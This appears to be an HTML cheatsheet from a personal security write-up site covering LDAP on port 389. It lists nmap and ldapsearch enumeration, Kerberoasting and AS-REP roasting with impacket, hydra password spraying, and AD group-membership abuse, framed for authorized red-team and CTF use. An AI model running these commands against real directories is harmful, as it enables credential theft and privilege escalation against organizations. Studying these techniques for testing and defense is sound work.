@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>389 — LDAP (Lightweight Directory Access Protocol)</title>
+  <style>
+    :root {
+      --neon: #00ff99;
+      --bg: #000;
+      --border: 1px solid var(--neon);
+      --font: 'Courier New', Courier, monospace;
+    }
+
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--neon);
+      font-family: var(--font);
+      text-shadow: 0 0 5px var(--neon);
+      line-height: 1.6;
+    }
+
+    header {
+      text-align: center;
+      padding: 2.25rem;
+      border-bottom: var(--border);
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 2.4rem;
+    }
+
+    main {
+      max-width: 900px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+
+    h2 {
+      border-bottom: var(--border);
+      padding-bottom: 0.4rem;
+    }
+
+    code, pre {
+      background: rgba(0,255,153,0.07);
+      padding: 0.3rem 0.5rem;
+      border-radius: 6px;
+      color: var(--neon);
+      display: block;
+      overflow-x: auto;
+    }
+
+    details {
+      margin-bottom: 1.25rem;
+      border: var(--border);
+      border-radius: 8px;
+      padding: 1rem;
+    }
+
+    summary {
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 1.1rem;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem;
+      border-top: var(--border);
+      margin-top: 2rem;
+      font-size: 0.9rem;
+    }
+
+    a { color: var(--neon); }
+    a:hover { text-shadow: 0 0 10px var(--neon); }
+
+    .nav-link {
+      color: var(--neon);
+      text-decoration: none;
+      font-weight: 700;
+      text-shadow: 0 0 6px var(--neon);
+    }
+    .nav-link:hover { text-shadow: 0 0 10px var(--neon); }
+
+    hr.soft {
+      border: 0;
+      height: 1px;
+      background: rgba(0,255,153,0.06);
+      margin: 1.5rem 0;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Port 389 — LDAP (Lightweight Directory Access Protocol)</h1>
+    <p>A guide to enumeration and exploitation of LDAP directory services</p>
+    <nav>
+      <a class="nav-link" href="https://www.studioellipsis.org/Computing/Tools/Marauders_Map.html">&lt;--</a>
+    </nav>
+  </header>
+
+  <main>
+    <h2>0) What is LDAP?</h2>
+    <p>
+      LDAP is a directory access protocol commonly used to query and modify directory services (Active Directory, OpenLDAP). By default it runs on TCP/UDP port 389 (plaintext); LDAPS (LDAP over TLS) typically runs on 636. LDAP stores user accounts, group membership, computer objects, and configuration data — making it extremely valuable during engagements.
+    </p>
+
+    <details open>
+      <summary>1) Recon Phase</summary>
+      <pre>
+- Discover LDAP service and version:
+    nmap -sV -p 389 --script=ldap-rootdse,ldap-search <target>
+
+- Query DNS for domain controllers (SRV records):
+    dig _ldap._tcp.dc._msdcs.<domain> SRV
+
+- Passive recon: collect domain names, public LDAP/AD endpoints, and service principal names (SPNs) via OSINT
+- Check for anonymous bind allowed (quick win)
+      </pre>
+      <p>
+        Start by identifying if LDAP accepts anonymous binds and whether it advertises schema or rootDSE info. Domain controllers are high-priority targets.
+      </p>
+    </details>
+
+    <details>
+      <summary>2) Enumeration Phase</summary>
+      <pre>
+# Test anonymous bind and basic queries
+ldapsearch -x -h <target> -b "" -s base namingContexts
+
+# Anonymous bind + enumerate common containers
+ldapsearch -x -h <target> -b "dc=example,dc=com" "(objectClass=*)" cn,sn,mail
+
+# Authenticated enumeration (when creds available)
+ldapsearch -D "user@domain" -w 'password' -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName,memberOf,mail,distinguishedName
+
+# SPN enumeration (Kerberos targets)
+setspn -L <domainuser>        # on Windows host or via tools that query LDAP
+
+# Use nmap NSE scripts for LDAP enumeration
+nmap --script ldap-rootdse,ldap-search -p389 <target>
+
+# Use BloodHound ingestion (via SharpHound) when actually on-network to build AD graph
+      </pre>
+      <p>
+        Look for: domain structure (OU’s), user accounts, privileged groups (Domain Admins, Enterprise Admins), computer accounts, SPNs (for Kerberoasting), service account names, and password policy details.
+      </p>
+    </details>
+
+    <details>
+      <summary>3) Exploitation Phase</summary>
+      <pre>
+- Anonymous bind => dump users/groups and password policy
+    ldapsearch -x -h <target> -b "dc=example,dc=com" "(objectClass=user)"
+
+- Kerberoasting (if SPNs found):
+    # request service tickets for SPNs and crack offline to recover service account passwords
+
+- AS-REP roast (if accounts have DONT_REQ_PREAUTH):
+    GetTGT for user and crack offline if unsupported preauth
+
+- LDAP credential brute-force / password spray (authorized only):
+    hydra -L users.txt -P passwords.txt ldap://<target>
+
+- AD ACL abuse / LDAP modify (if creds with enough rights):
+    - modify group membership to escalate
+    - create new user and add to privileged groups (authorized CTF only)
+
+- Abuse LDAPS/StartTLS TLS misconfigurations to downgrade or capture creds on network (authorized lab)
+- Use recovered credentials to access RDP/SMB/HTTP services
+      </pre>
+      <p>
+        Focus on enumerating high-privilege principals and SPNs for Kerberoast. If write access exists, follow rules of engagement — changes to AD are high-impact and often scored in CTFs.
+      </p>
+    </details>
+
+    <details>
+      <summary>LDAP Info — What to Look For</summary>
+      <ul>
+        <li>Anonymous bind allowed or weak anonymous access controls</li>
+        <li>Exposed namingContexts / rootDSE revealing domain base DN</li>
+        <li>Privileged groups membership (Domain Admins, Enterprise Admins)</li>
+        <li>Service Principal Names (SPNs) for Kerberoasting</li>
+        <li>Accounts without pre-auth (AS-REP roastable)</li>
+        <li>Password policy details and lockout settings that affect spraying</li>
+        <li>LDAP over plaintext (389) where STARTTLS is not required</li>
+      </ul>
+    </details>
+
+    <h2>Tools Required</h2>
+    <pre>
+sudo apt install nmap ldap-utils hydra
+# Useful tooling:
+# - impacket (GetUserSPNs, GetNPUsers) for Kerberoast / AS-REP
+# - BloodHound + SharpHound for AD graphing (when on-network)
+# - ldapdomaindump for quick dumps of AD via LDAP
+# - python-ldap / ldap3 for scripted queries
+    </pre>
+
+    <h2>Quick copy-paste command cheatsheet</h2>
+    <pre>
+# service discovery & rootDSE
+nmap -sV -p 389 --script=ldap-rootdse,ldap-search <target>
+
+# check for anonymous bind & list namingContexts
+ldapsearch -x -h <target> -b "" -s base namingContexts
+
+# anonymous bind & enumerate users (if allowed)
+ldapsearch -x -h <target> -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName,distinguishedName,memberOf
+
+# authenticated query (when creds available)
+ldapsearch -x -D "administrator@example.com" -w 'Password123!' -b "dc=example,dc=com" "(objectClass=person)" cn,mail
+
+# Kerberoast: discover SPNs (impacket)
+GetUserSPNs.py -request -dc-ip <dc-ip> -outputfile spns.txt domain/username:password
+
+# AS-REP roast (impacket)
+GetNPUsers.py -dc-ip <dc-ip> -no-pass -outputfile asrep.json domain/ -usersfile users.txt
+
+# brute/spray (authorized)
+hydra -L users.txt -P passwords.txt ldap://<target>
+    </pre>
+
+    <h2>Red-team / CTF tips</h2>
+    <ul>
+      <li>Anonymous bind and rootDSE give fast wins — capture base DN early.</li>
+      <li>Scan for SPNs and AS-REP roastable accounts quickly — cracking those offline yields creds without noisy online attacks.</li>
+      <li>Respect lockout policy — prefer Kerberoast/AS-REP over noisy full-account brute force in competition.</li>
+      <li>Use BloodHound to prioritise high-value attack paths once you have credentials or enumeration data.</li>
+    </ul>
+
+    <h2>Citations</h2>
+    <ul>
+      <li><a href="https://tools.ietf.org/html/rfc4510" target="_blank" rel="noopener">RFC 4510 — LDAP: Technical Specification</a></li>
+      <li><a href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html" target="_blank" rel="noopener">Nmap NSE — ldap-rootdse / ldap-search</a></li>
+      <li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">Impacket — useful AD / Kerberos tooling (GetUserSPNs, GetNPUsers)</a></li>
+    </ul>
+
+    <hr class="soft" />
+    <p style="font-size:0.95rem;opacity:0.95;">
+      <strong>Disclaimer:</strong> This guidance targets authorized testing and red-team/CTF contexts. Accessing or modifying directory data without explicit permission is illegal and unethical. AD modifications (user creation/group edits) are high-impact — only perform them within scope and per rules of engagement.
+    </p>
+  </main>
+
+  <footer>
+    &copy; 2025 Riley Owen — Studio Ellipsis Cybersecurity Writeups
+  </footer>
+</body>
+</html>
